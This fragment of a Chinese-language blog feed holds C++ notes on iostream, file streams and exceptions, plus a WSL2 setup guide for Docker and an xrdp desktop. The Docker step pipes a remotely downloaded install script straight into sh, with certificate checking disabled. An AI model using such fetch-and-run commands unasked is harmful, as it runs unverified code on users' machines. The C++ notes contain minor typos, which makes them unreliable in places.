*</code>等，都可以写成这种形式，这给用户提供了很大的方便。如果要输入用户自己定义的类型数据，就要用友元方式重载&gt;&gt;运算符;</li></ul><h5 id="成员函数"><a class="markdownIt-Anchor" href="#成员函数"></a> 成员函数</h5><table><thead><tr><th>控制符</th><th>功能</th><th>举例</th></tr></thead><tbody><tr><td><code>char get()</code></td><td>读入一个字符并返回(包括回车、tab、空格等空白字符)，遇到ctrl+z才结束</td><td></td></tr><tr><td><code>istream&amp; get(char &amp;)</code></td><td>读入一个字符,如果读取成功则返回非 0 值(真),如失败(遇到文件结束符)，则函数返回 0 值(假)。</td><td></td></tr><tr><td><code>istream&amp; get(char *, int ,char )</code></td><td>istream&amp; get(字符数组，字符个数 n,终止字符)<br>istream &amp; get(字符指针，字符个数 n,终止字符)从输入流中读取 n-1 字符，赋给字符数组或字符指针所指向的数组。如果在读取 n-1 个字符之前遇到终止字符，则提前结束。如果成功则返回非 0，失败 则返回 0。会清空<code>char*</code>指向的空间，未读到 n-1 个字符或中止符，则会阻塞。不会越过中止符。</td><td></td></tr><tr><td><code>istream&amp; getline(char *, int , char)</code></td><td>与带三个参数的 get()功能类似，从输入流中读取 n-1 字符，赋给字符数组或字符指针所指向的空间。如果在读取 n-1 个字符之前遇到终止字符（如果不写，默认为’\n’），则提前结束。会清空 <code>char*</code>指向的空间，未读到 n-1 个字符或中止符，则会阻塞。会越过中止符</td><td></td></tr><tr><td><code>istream&amp;ignore(streamsize n = 1, int delim= EOF</code>);</td><td>跳过流中的 n 个字符，或遇到终止字符为止（包含）, 默认参数忽略一个字符。</td><td></td></tr><tr><td><code>int peek();</code></td><td>窥视 当前指针未发生移动</td><td></td></tr><tr><td><code>istream&amp; putback (char c);</code></td><td>回推 插入当前指针位置</td><td></td></tr></tbody></table><ul><li>get 和 getline 最大的区别就是，get 遇到界定符时，停止执行，但并不从流中提取界定符，再次调用会遇到同一个界定符，函数将立即返回，不会提取输入。getline 则不同，它将从输入流中提供界定符，但不会把它放到缓冲区中。</li></ul><h3 id="文件-io-流"><a class="markdownIt-Anchor" href="#文件-io-流"></a> 文件 IO 流</h3><ul><li>指程序与数据的交互是以流的形式进行的.进行 C 语言文件的存取时,都会先进行“打开文件”操作,这个操作就是在打开数据流,而“关闭文件”操作就是关闭数据流。</li></ul><h4 id="缓冲区buffer"><a class="markdownIt-Anchor" href="#缓冲区buffer"></a> 缓冲区(Buffer)</h4><ul><li><p>指在程序执行时,所提供的额外内存,可用来暂时存放做准备执行的数据.它的设置是为了提高存取效率,因为内存的存取速度比磁盘驱动器快得多. C++ 语言中带缓冲区的文件处理：</p></li><li><p>C++ 语言的文件处理功能依据系统是否设置“缓冲区”分为两种：</p><ul><li>一种是设置缓冲区</li><li>另一种是不设置缓冲区</li></ul></li><li><p>当使用标准 I/O 函数(包含在头文件 cstdio 中)时,系统会自动设置缓冲区,并通过数据流来读写文件. 当进行文件读取时,不会直接对磁盘进行读取,而是先打开数据流,将磁盘上的文件信息拷贝到缓冲区内,然后程序再从缓冲区中读取所需数据,如下图所示：</p></li><li><p>文件类型分为文本文件和二进制文件两种.</p></li><li><p>文件存取方式：包括顺序存取方式和随机存取方式两种.</p><ul><li>顺序读取：也就是从上往下,一笔一笔读取文件的内容.保存数据时,将数据附加在文件的末尾.这种存取方式常用于文本文件,而被存取的文件则称为顺序文件.</li><li>随机存取：多半以二进制文件为主.它会以一个完整的单位来进行数据的读取和写入,通常以结构为单位.</li></ul></li></ul><h4 id="借助文件指针读写文件"><a class="markdownIt-Anchor" href="#借助文件指针读写文件"></a> 借助文件指针读写文件</h4><ul><li>我们如果要访问文件,要借助于文本变量,即文件指针<code>FILE *</code>才可以完成。文件在进行读写操作之前要先打开,使用完毕要关闭.所谓打开文件,实际上是建立文件的各种有关信息,并使文件指针指向该文件,以便进行其它操作.关闭文件则断开指针与文件之间的联系,也就禁止再对该文件进行操作。</li></ul><h4 id="文件流类与文件流对象"><a class="markdownIt-Anchor" href="#文件流类与文件流对象"></a> 文件流类与文件流对象</h4><ul><li>对文件的操作是由文件流类完成的。文件流类在流与文件间建立连接。由于文件流分为三种：文件输入流、文件输出流、文件输入/输出流，所以相应的必须将文件流说明为 ifstream、ofstream 和 fstream 类的对象，然后利用文件流的对象对文件进行操作。</li><li>对文件的操作过程可按照一下四步进行：即定义文件流类的对象、打开文件、对文件进行读写操作、关闭文件。</li></ul><h4 id="文件的打开和关闭"><a class="markdownIt-Anchor" href="#文件的打开和关闭"></a> 文件的打开和关闭</h4><h5 id="定义流对象"><a class="markdownIt-Anchor" href="#定义流对象"></a> 定义流对象</h5><table><thead><tr><th>流类</th><th>流对象</th></tr></thead><tbody><tr><td>ifstream ifile;</td><td>定义一个文件输入流对象</td></tr><tr><td>ofstream ofile;</td><td>定义一个文件输出流对象</td></tr><tr><td>fstream iofile;</td><td>定义一个文件输出/输入流对象</td></tr></tbody></table><h5 id="打开文件"><a class="markdownIt-Anchor" href="#打开文件"></a> 打开文件</h5><ul><li>定义了文件流对象后，就可以利用其成员函数 open（）打开需要操作的文件，该成员函数的函数原型为：<code>void open（const unsigned char *filename,int mode,int access=filebuf:openprot）；</code>其中：filename 是一个字符型指针，指定了要打开的文件名；mode 指定了文件的打开方式，其值如下表所示；access 指定了文件的系统属性：</li></ul><table><thead><tr><th>文件打开方式</th><th>值</th><th>含 义</th></tr></thead><tbody><tr><td>ios::in</td><td>0x01</td><td>以输入（读）方式打开文件，若文件不存在则报错。</td></tr><tr><td>ios::out</td><td>0x02</td><td>以输出（写）方式打开文件, 若文件不存则创建。</td></tr><tr><td>ios::app</td><td>0x08</td><td>打开一个文件使新的内容始终添加在文件的末尾，若文件不存在，则报错。</td></tr><tr><td>ios::trunc</td><td>0x10</td><td>若文件存在，则清除文件所有内容；若文件不存在，则创建新文件。</td></tr><tr><td>ios::binary</td><td>0x80</td><td>以二进制方式打开文件，缺省时以文本方式打开文件。</td></tr><tr><td>ios::nocreate</td><td>0x20</td><td>打开一个已有文件，若该文件不存在，则打开失败。</td></tr><tr><td>ios::noreplace</td><td>0x40</td><td>若打开的文件已经存在，则打开失败。</td></tr></tbody></table><ul><li>说明：<ul><li>在实际使用过程中，可以根据需要将以上打开文件的方式用“|”组合起来。如：</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ios::in|ios::out 表示以读/写方式打开文件</span><br><span class="line">ios::in|ios:: binary 表示以二进制读方式打开文件</span><br><span class="line">ios::out|ios:: binary 表示以二进制写方式打开文件</span><br><span class="line">ios::in|ios::out|ios::binary 表示以二进制读/写方式打开文件</span><br></pre></td></tr></table></figure><ul><li>如果未指明以二进制方式打开文件，则默认是以文本方式打开文件。<ul><li>对于 ifstream 流， mode 参数的默认值为 ios::in，</li><li>对于 ofstream 流，mode 的默 认值为 ios::out|ios::trunc,</li><li>对于 fstream 流， mode 的默认值为 ios::int|ios::out|ios::app</li></ul></li><li>也可以通过，构造函数打开文件。</li><li>出错处理是通过，对类对象进行判断的。若文件打开成功，返回 1，否则返回 0</li></ul><h5 id="文件的关闭"><a class="markdownIt-Anchor" href="#文件的关闭"></a> 文件的关闭</h5><ul><li>在文件操作结束（即读、写完毕）时应及时调用成员函数 close()来关闭文件。该函数比较简单，没有参数和返回值。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">&quot;xxx.txt&quot;</span>,ios::in)</span></span>;</span><br><span class="line"><span class="keyword">if</span>(!ifs)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;open error1&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">if</span>(ifs&gt;&gt;buf)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;buf&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;yyy.txt&quot;</span>,ios::out|ios::app)</span></span>;</span><br><span class="line"><span class="keyword">if</span>(!ofs)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;open error2&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">ofs&lt;&lt;<span class="string">&quot;abcefldkj&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="function">fstream <span class="title">fs</span><span class="params">(<span class="string">&quot;zzz.txt&quot;</span>,ios::in|ios::out|ios::app)</span></span>;<span class="comment">//app 有创建文件的功能 trunc 也有，但是清空</span></span><br><span class="line"><span class="keyword">if</span>(!fs)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;open error3&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">fs&lt;&lt;<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">fs.seekg(<span class="number">0</span>,ios::beg);</span><br><span class="line">fs&gt;&gt;buf;</span><br><span class="line"><span class="keyword">if</span>(fs)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;buf&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><h4 id="流文件状态与判断"><a class="markdownIt-Anchor" href="#流文件状态与判断"></a> 流文件状态与判断</h4><ul><li>系统为了标识当前文件操作的状态，提供了标识位和检查标识位的函数。</li><li>标识位：<code>ios_base.h</code></li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>eof()</td><td>如果读文件到达文件末尾，返回 true。</td></tr><tr><td>bad()</td><td>如果在读写过程中出错，返回 true 。例如：当我们要对一个不是打开为写状态的文件进行写入时，或者我们要写入的设备没有剩余空间的时候。</td></tr><tr><td>fail()</td><td>除了与 bad() 同样的情况下会返回 true 以外，加上格式错误时也返回 true ，例如当想要读入一个整数，而获得了一个字母的时候。或是遇到 eof。</td></tr><tr><td>good()</td><td>这是最通用的：如果调用以上任何一个函数返回 true 的话，此函数返回 false 。</td></tr><tr><td>clear()</td><td>标识位一旦被置位，这些标志将不会被改变，要想重置以上成员函数所检查的状态标志，你可以使用成员函数 clear()，没有参数。比如:通过函数移动文件指针，并不会使 eofbit</td></tr><tr><td>自动重置。</td><td></td></tr></tbody></table><h4 id="文件的读写操作"><a class="markdownIt-Anchor" href="#文件的读写操作"></a> 文件的读写操作</h4><ul><li>在打开文件后就可以对文件进行读写操作了。从一个文件中读出数据，可以使用文件流类的 get、getline、read 成员函数以及运算符“&gt;&gt;”；</li><li>而向一个文件写入数据，可以使用其 put、write 函数以及插入符“&lt;&lt;”，如下表所示：</li></ul><h5 id="流状态的查询和控制"><a class="markdownIt-Anchor" href="#流状态的查询和控制"></a> 流状态的查询和控制</h5><ul><li>可以如下管理输入操作</li><li>这个循环不断读入 cin，直到到达文件结束符或者发生不可恢复的读取错误为止。循环条件使用了逗号操作符。回顾逗号操作符的求解过程：首先计算它的每一个操作数，然后返回最右边操作数作为整个操作的结果。因此，循环条件只读入 cin 而忽略了其结果。该条件的结果是 !cin.eof() 的值。如果 cin 到达文件结束符，条件则为假，退出循环。如果 cin没有到达文件结束符，则不管在读取时是否发生了其他可能遇到的错误，都进入循环在循环中，首先检查流是否已破坏。如果是的放，抛出异常并退出循环。如果输入无效，则输出警告并清除 failbit 状态。在本例中，执行 continue 语句,回到 while 的开头，读入另一个值 ival。如果没有出现任何错误，那么循环体中余下的部分则可以很安全地使用ival</li></ul><h5 id="读写文件本文件"><a class="markdownIt-Anchor" href="#读写文件本文件"></a> 读写文件本文件</h5><ul><li>读出：<ul><li>operator&gt;&gt;</li><li>int get();</li><li>istream&amp; get(int);</li><li>istream &amp; get(char*,int n, char deli ) istream&amp; getline(char * ,int n);</li></ul></li><li>写入:<ul><li>operator&lt;&lt;</li><li>osream put(int)</li></ul></li></ul><h5 id="读写二进制文件"><a class="markdownIt-Anchor" href="#读写二进制文件"></a> 读写二进制文件</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ostream &amp; <span class="title">write</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * buffer,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function">istream &amp; <span class="title">read</span><span class="params">(<span class="keyword">char</span> * buff, <span class="keyword">int</span> len)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="随机读写函数"><a class="markdownIt-Anchor" href="#随机读写函数"></a> 随机读写函数</h5><ul><li>与文件指针相关的函数如下：</li></ul><table><thead><tr><th>成员函数</th><th>作用</th></tr></thead><tbody><tr><td>tellg();</td><td>返回当前指针位置 //输入流操作</td></tr><tr><td>seekg(绝对位置);</td><td>绝对移动，</td></tr><tr><td>seekg(相对位置,参照位置);</td><td>相对操作</td></tr><tr><td>seekp(绝对位置);</td><td>绝对移动， //输出流操作</td></tr><tr><td>seekp(相对位置,参照位置);</td><td>相对操作</td></tr><tr><td>tellp();</td><td>返回当前指针位置</td></tr></tbody></table><ul><li>用于输入的函数。p 代表 put 的意思，用于输出函数。如果是既可输入又可输出的文件，则任意使用。</li></ul><table><thead><tr><th>参照位置成员</th><th>意义</th></tr></thead><tbody><tr><td>ios::beg = 0</td><td>相对于文件头</td></tr><tr><td>ios::cur = 1</td><td>相对于当前位置</td></tr><tr><td>ios::end = 2</td><td>相对于文件尾</td></tr></tbody></table><ul><li>代码示例：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">infile.seekg(<span class="number">100</span>); <span class="comment">//输入文件中的指针向前移到 100 个字节的位置</span></span><br><span class="line">infile.seekg(<span class="number">-50</span>,ios::cur); <span class="comment">//输入文件中的指针从当前位置后移 50 个字节</span></span><br><span class="line">outfile.seekp(<span class="number">-75</span>,iso::end); <span class="comment">//输出文件中指针从文件尾后移 50 个字节</span></span><br></pre></td></tr></table></figure><h2 id="异常exception"><a class="markdownIt-Anchor" href="#异常exception"></a> 异常(Exception)</h2><ul><li><p>c 语言中错误的处理，通常采用返回值的方式或是置位全局变量的方式。这就存在两个问题。如果返回值正是我们需要的数据，且返回数据同出错数据容错差不高。全局变量，在多线程中易引发竞争。而且，当错误发生时，上级函数要出错处理，层层上报，造成过多的出错处理代码，且传递的效率低下。为此 c++提供了异常。</p></li><li><p>数组的异常捕获</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">int</span> *pi = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100</span>];</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">const</span> <span class="built_in">std</span>::bad_alloc e)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;e.what&lt;&lt;<span class="string">&quot;some err&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> *pi = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow)<span class="keyword">int</span>[<span class="number">100</span>];<span class="comment">// 不抛出异常</span></span><br><span class="line"><span class="keyword">if</span>(pi==<span class="literal">NULL</span>)<span class="built_in">exit</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="异常语法"><a class="markdownIt-Anchor" href="#异常语法"></a> 异常语法</h3><ul><li><p>异常使用</p><ol><li>把可能发生异常的语句放在 try 语句声当中。try 原有语句的执行流程。</li><li>若未发生异常，catch 子语句并不起作用。程序会流转到 catch 子句的后面执行。</li><li>若 try 块中发生异常，则通过 throw 抛出异常。throw 抛出异常后，程序立即离开本函数，转到上一级函数。所以 triangle 函数中的 return 语句不会执行。</li><li>throw 抛出数据，类型不限。既可以是基本数据类型，也可以是构造数据类型。</li><li>程序流转到 main 函数以后，try 语句块中 抛出进行匹配。匹配成功，执行 catch 语句，catch 语句执行完毕后。继续执行后面的语句。如无匹配，系统调用 terminate 终止程序。</li></ol></li><li><p>语法格式</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">被检查的语句</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常信息类型 [变量名])&#123;</span><br><span class="line">进行异常处理的语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>语法要点：<ol><li>被检语句必须放在 try 块中，否则不起作用。</li><li>try catch 中花括号不可省。</li><li>一个 try-catch 结构中，只能有一个 try 块，catch 块却可以有多个。以便与不同的类型信息匹配。</li><li>throw 抛出的类型，既可以是系统预定义的标准类型也可以是自定义类型。从抛出到catch 是一次复制拷贝的过程。如果有自定义类型，要考虑自定义类型的拷贝问题。</li><li>如果 catch 语句没有匹配异常类型信息，就可以用(…)表示可以捕获任何异常类型的信息。</li><li>try-catch 结构可以与 throw 在同一个函中数中，也可以不在同一个函数中，throw 抛出异常后，先在本函数内寻找与之匹配的 catch 块，找不到与之匹配的就转到上一层，如果上一层也没有，则转到更上一层的 catch 块。如果最终找不到与之匹配的 catch 块，系统则会调有生个系统函数，terminate,使程序终止。</li></ol></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">triangle</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">double</span> y, <span class="keyword">double</span> z)</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> area;<span class="keyword">double</span> s = (x+y+z)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(x+y&gt;z &amp;&amp; y+z&gt;x &amp;&amp; x+z &gt;y)</span><br><span class="line">area = <span class="built_in">sqrt</span>(s*(s-x)*(s-y)*(s-z));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">throw</span> <span class="number">4</span>; <span class="comment">//throw 数据为任意类型</span></span><br><span class="line"><span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b,c;<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(a&gt;<span class="number">0</span>&amp;&amp;b&gt;<span class="number">0</span>&amp;&amp;c&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;triangle(a,b,c)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">int</span>)  <span class="comment">// 接收异常类型，和抛处类型要一致，否则会掉入C++默认的异常处理。</span></span><br><span class="line">&#123;<span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;b&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;c&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;<span class="string">&quot;构不成三角形&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;end&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="抛出类型声明"><a class="markdownIt-Anchor" href="#抛出类型声明"></a> 抛出类型声明</h3><ol><li>为了加强程序的可读性，可以在函数声明中列出可能抛出的所有异常类型。例如：<code>void func() throw (A, B, C , D);</code>这个函数 func（）能够且只能抛出类型 A B C D及其子类型的异常。</li><li>如果在函数声明中没有包含异常接口声明，则函数可以抛掷任何类型的异常，例如：<code>void func();</code></li><li>一个不抛掷任何类型异常的函数可以声明为：<code>void func() throw();</code></li><li>如果一个函数抛出了它的异常接口声明所不允许抛出的异常，unexpected 函数会被 调用，该函数默认行为调用 terminate 函数中止程序。</li></ol><h3 id="栈自旋"><a class="markdownIt-Anchor" href="#栈自旋"></a> 栈自旋</h3><ul><li>异常被抛出后，从进入 try 块起，到异常被抛掷前，这期间在栈上的构造的所有对象，都会被自动析构。析构的顺序与构造的顺序相反。这一过程称为栈的解旋(unwinding)。而堆上的空间，则会泄漏。</li></ul><h2 id="stl"><a class="markdownIt-Anchor" href="#stl"></a> STL</h2><h2 id="c11"><a class="markdownIt-Anchor" href="#c11"></a> C11</h2><h2 id="boost"><a class="markdownIt-Anchor" href="#boost"></a> Boost</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl2</title>
      <link href="/2020/07/07/wsl2/"/>
      <url>/2020/07/07/wsl2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>windows对linux的支持</p></blockquote><a id="more"></a><h1 id="安装wsl"><a class="markdownIt-Anchor" href="#安装wsl"></a> 安装wsl</h1><ul><li><p><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10">教程链接</a></p></li><li><p>如果电脑上删除了windows应用商店，可以用如下方法重新安装：</p><ul><li>Windows+x选A，以管理员身份运行WindowsPowerShell</li><li>输入命令<code>Get-AppxPackage -allusers | Select Name, PackageFullName</code>，获取当前系统安装的所有应用。</li><li>在列表中找到名称为“Microsoft.WindowsStore”(即应用商店)的应用，然后复制右侧对应的包名称。<code>Microsoft.WindowsStore_11801.1001.6.0_x64__8wekyb3d8bbwe</code></li><li>输入下列命令进行应用商店的重装（版本不同包名称也不同，下列命令看着替换一下自己的包名称就好了。）：<code>Add-appxpackage -register &quot;C:\Program Files\WindowsApps\Microsoft.WindowsStore_11801.1001.6.0_x64__8wekyb3d8bbwe\appxmanifest.xml&quot; -disabledevelopmentmode</code></li><li>打开开始菜单，应用商店已装回。</li></ul></li></ul><h1 id="安装docker"><a class="markdownIt-Anchor" href="#安装docker"></a> 安装docker</h1><ul><li><a href="http://mirror.azure.cn/help/docker-engine.html">安装命令</a></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -skSL https:&#x2F;&#x2F;mirror.azure.cn&#x2F;repo&#x2F;install-docker-ce.sh | sh -s -- --mirror AzureChinaCloud</span><br></pre></td></tr></table></figure><ul><li>启动docker</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><ul><li>拉镜像</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker pull nginx</span><br></pre></td></tr></table></figure><ul><li>配置端口映射</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker run --name nginx:latest -p 8080:80 -d nginx</span><br></pre></td></tr></table></figure><ul><li>在windows访问<code>http://localhost:8080</code></li></ul><h1 id="图形界面"><a class="markdownIt-Anchor" href="#图形界面"></a> 图形界面</h1><h2 id="图形界面介绍"><a class="markdownIt-Anchor" href="#图形界面介绍"></a> 图形界面介绍</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>xfce4图形界面</td><td>一是因为该界面安装耗费的空间小，不到1GB，具体的没截图，相比其它图形界面动辄2GB而<br>二是因为用该界面主要是有一个图形界面可以使用spacemacs</td></tr></tbody></table><h2 id="更新源"><a class="markdownIt-Anchor" href="#更新源"></a> 更新源</h2><ul><li>更改源文件配置，更改中不能有空行</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><ul><li>阿里云镜像</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><ul><li>更新</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h2 id="环境"><a class="markdownIt-Anchor" href="#环境"></a> 环境</h2><ul><li>安装xfce4图形界面</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y xfce4</span><br></pre></td></tr></table></figure><ul><li>安装xrdp</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y xrdp</span><br></pre></td></tr></table></figure><ul><li>配置 xrdp 端口</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo sed -i &#39;s&#x2F;port&#x3D;3389&#x2F;port&#x3D;3390&#x2F;g&#39; &#x2F;etc&#x2F;xrdp&#x2F;xrdp.ini</span><br></pre></td></tr></table></figure><ul><li><p>这里面 3389 是默认配置，这里将其改为 3390 是避免和 windows 的端口冲突。因为两边的端口号是通的，在 wsl 中开一个 8080 端口的 WebServer，在 windows 可以直接访问。</p></li><li><p>配置 xsession，这一步其实是在告诉系统，开启桌面环境的时候开启什么桌面环境。</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> xfce4-session &gt;~/.xsession</span><br></pre></td></tr></table></figure><ul><li>启动 xrdp</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service xrdp restart</span><br></pre></td></tr></table></figure><ul><li><p>远程连接：在 win10 开始菜单中搜远程桌面，或按win+r 后输入mstsc<br />在计算机后面输入 localhost:3390 点击连接，用户名这里用root。首次连接可能需要较长时间。</p></li><li><p>注意事项：</p><ul><li>如果WSL的Ubuntu系统关闭，如关机重启，会导致远程连接不上，此时需要先在Win10中打开Ubuntu的命令行界面，输入：</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service xrdp restart</span><br></pre></td></tr></table></figure><ul><li>此时再远程连接，即可连接上。</li></ul><h1 id="问题汇总"><a class="markdownIt-Anchor" href="#问题汇总"></a> 问题汇总</h1><h2 id="win10-2004-wsl2-error-0x800701bc"><a class="markdownIt-Anchor" href="#win10-2004-wsl2-error-0x800701bc"></a> Win10 2004 WSL2 ERROR: 0x800701bc</h2><ul><li>uninstall the Linux kernel (or Windows Subsystem for Linux Update) by running this program</li><li>installed the msi again from <a href="https://aka.ms/wsl2kernel">https://aka.ms/wsl2kernel</a></li></ul><h2 id="error-0x80370102"><a class="markdownIt-Anchor" href="#error-0x80370102"></a> Error 0x80370102</h2><ol><li>安装条件检查</li></ol><ul><li>任务管理器-&gt;性能：查看Virtual machine，如果此处是no的，请更改bios设置</li></ul><ol start="2"><li>按照指南安装</li></ol><ul><li>设置-》应用-》程序和功能-》启用或关闭windows功能</li></ul><p><img src="/images/pasted-82.png" alt="开启三个功能" /></p><ol start="3"><li>恢复到初始状态，然后转2，直到成功</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All</span><br><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform</span><br><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link 